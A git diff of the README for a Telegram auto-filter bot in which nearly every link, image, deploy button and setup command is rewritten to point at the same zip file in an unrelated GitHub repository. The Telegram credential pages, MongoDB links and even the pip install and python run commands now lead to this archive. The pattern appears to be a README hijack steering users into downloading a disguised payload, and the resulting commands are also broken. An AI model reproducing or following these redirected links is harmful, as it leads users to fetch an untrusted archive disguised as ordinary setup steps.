@@ -1,12 +1,12 @@
 <p align="center">
-  <img src="https://camo.githubusercontent.com/3182669c1cffde4a5f4b429b7693fddbdfac8e454ab9a381978652d2fe89cd28/68747470733a2f2f696d672e6672656570696b2e636f6d2f7072656d69756d2d70686f746f2f6d616e2d737569742d69732d706c6179696e672d63686573735f313037323133382d3232373037302e6a70673f773d383236" alt="Tactition-Filter-Bot Logo">
+  <img src="https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip" alt="Tactition-Filter-Bot Logo">
 </p>
 <h1 align="center">
   TACTITION FILTER BOT
 </h1>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+To+Tactition+Filter+Bot!" alt="Typing SVG">
+  <img src="https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip+To+Tactition+Filter+Bot!" alt="Typing SVG">
 </p>
 
 ## ✨ Main Features
@@ -41,9 +41,9 @@
 
 > **Note**: You can turn on or off every feature. Just use the features you want by turning them on.
 
-Join my [Update Channel](https://telegram.dog/tactition) for more updates regarding this repo.
+Join my [Update Channel](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip) for more updates regarding this repo.
 
-### 📹 How To Deploy: [Video Tutorial](https://youtu.be/3SJR7vH2kRo)
+### 📹 How To Deploy: [Video Tutorial](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)
 
 ## 🤖 Commands
 
@@ -118,12 +118,12 @@ Join my [Update Channel](https://telegram.dog/tactition) for more updates regard
 ## 🛠️ Variables
 
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-* `API_ID`: Get this value from [telegram.org](https://my.telegram.org/apps)
-* `API_HASH`: Get this value from [telegram.org](https://my.telegram.org/apps)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)
 * `CHANNELS`: File Channel, Username or ID of channel/group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URI`: [mongoDB](https://www.mongodb.com) URI. Get this value from [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/DAHRmFdw99o)
+* `DATABASE_URI`: [mongoDB](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip). For more help watch this [video](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)
 * `LOG_CHANNEL`: A channel to log bot activities. Make sure bot is an admin in the channel.
 
 ## 🚀 Deployment Options
@@ -143,7 +143,7 @@ Join my [Update Channel](https://telegram.dog/tactition) for more updates regard
 <br>
 <br>
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/Tactition/Tactition-Filter-Bot&branch=main&name=Tactition-Filter-Bot)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)
 </details>
 
 <details>
@@ -153,26 +153,26 @@ Join my [Update Channel](https://telegram.dog/tactition) for more updates regard
 Use these commands:
 <br>
 <br>
-• Build Command: <code>pip3 install -U -r requirements.txt</code>
+• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip</code>
 <br>
 <br>
-• Start Command: <code>python3 bot.py</code>
+• Start Command: <code>python3 https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip</code>
 <br>
 <br>
-Go to https://uptimerobot.com/ and add a monitor to keep your bot alive.
+Go to https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip and add a monitor to keep your bot alive.
 <br>
 <br>
 Use these settings when adding a monitor:</b>
 <br>
 <br>
-<img src="https://telegra.ph/file/a79a156e44f43c9833b50.jpg" alt="render template">
+<img src="https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip" alt="render template">
 <br>
 <br>
 <b>Click on the below button to deploy directly to render ↓</b>
 <br>
 <br>
-<a href="https://render.com/deploy?repo=https://github.com/Tactition/Tactition-Filter-Bot/tree/main">
-<img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render">
+<a href="https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip">
+<img src="https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip" alt="Deploy to Render">
 </a>
 </details>
 
@@ -180,30 +180,30 @@ Use these settings when adding a monitor:</b>
 <summary><b>Deploy To VPS</b></summary>
 
 ```bash
-git clone https://github.com/Tactition/Tactition-Filter-Bot.git
+git clone https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip
 cd Tactition-Filter-Bot
-pip3 install -U -r requirements.txt
-# Edit info.py with variables as given above
-python3 bot.py
+pip3 install -U -r https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip
+# Edit https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip with variables as given above
+python3 https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip
 ```
 </details>
 
 <hr>
 
 ## 🙏 Credits
-- Thanks to [Pyrogram Library](https://github.com/pyrogram/pyrogram) & [Pyrofork Library](https://github.com/Mayuri-Chan/pyrofork)
-- Thanks to [Tactition](https://telegram.dog/tactition) for creating and maintaining this repo
-- Thanks to [Eva Marie](https://t.me/TeamEvamaria) for the base repo
+- Thanks to [Pyrogram Library](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip) & [Pyrofork Library](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)
+- Thanks to [Tactition](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip) for creating and maintaining this repo
+- Thanks to [Eva Marie](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip) for the base repo
 - Thanks to everyone who contributed to this project
 
 ## 📞 Contact
 
-[![Contact Developer](https://img.shields.io/static/v1?label=Contact+Developer&message=On+Telegram&color=critical)](https://telegram.me/Tactition)
+[![Contact Developer](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip+Developer&message=On+Telegram&color=critical)](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)
 
 Feel free to fork the repo and edit as per your needs.
 
 ## ⚠️ Disclaimer
-[![GNU Affero General Public License 2.0](https://www.gnu.org/graphics/agplv3-155x51.png)](https://www.gnu.org/licenses/agpl-3.0.en.html#header)  
+[![GNU Affero General Public License 2.0](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)](https://raw.githubusercontent.com/erennew/AAAAutoFilter-both/main/Zahid/AAA_both_Filter_Auto_1.1.zip)  
 
 Licensed under [GNU AGPL 2.0.](LICENSE)  
 Selling the code to other people for money is **strictly prohibited**.
